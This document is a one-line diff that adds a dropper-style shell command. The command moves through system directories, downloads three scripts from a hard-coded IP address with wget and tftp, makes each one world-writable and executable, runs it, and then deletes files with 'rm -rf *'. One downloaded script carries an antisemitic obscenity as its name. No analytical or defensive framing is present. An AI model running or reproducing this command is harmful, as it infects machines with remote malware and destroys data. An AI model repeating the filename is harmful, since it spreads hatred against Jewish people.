@@ -1,0 +1,1 @@
+cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://185.225.73.151/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 185.225.73.151 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.225.73.151; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
